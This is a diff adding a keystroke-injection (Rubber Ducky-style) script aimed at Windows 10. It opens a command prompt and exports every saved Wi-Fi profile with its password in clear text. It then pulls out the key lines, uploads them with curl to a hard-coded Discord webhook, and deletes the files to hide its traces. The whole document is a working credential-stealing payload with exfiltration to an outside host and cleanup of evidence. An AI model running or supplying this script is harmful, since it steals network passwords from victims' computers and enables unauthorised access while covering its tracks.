@@ -1,0 +1,26 @@
+REM Polish made this trying to code.
+REM Target Win 10
+REM Sending WIFI Passwords through a webhook
+REM Replace <your_webhook_here> with your webhook like https://webhook.site/4f8b246c-2071-49c5-baa6-07983dffc024
+GUI r
+DELAY 1500
+STRING CMD
+ENTER
+DELAY 1500
+STRING cd %temp%
+ENTER
+DELAY 1500
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1500
+STRING powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS
+ENTER
+DELAY 1500
+STRING curl https://discord.com/api/webhooks/1102917115872297010/8DoZlnf-6nYMvSsfCshNdN5uMvtxCFcxDtU8j-kUOERSH8ihrv6-RGbBDxDfU_H5LVms \ -F "file1=@Wi-Fi-PASS" --ssl-no-revoke
+ENTER
+DELAY 2500
+STRING del Wi-* /s /f /q
+ENTER
+DELAY 1500
+STRING exit
+ENTER
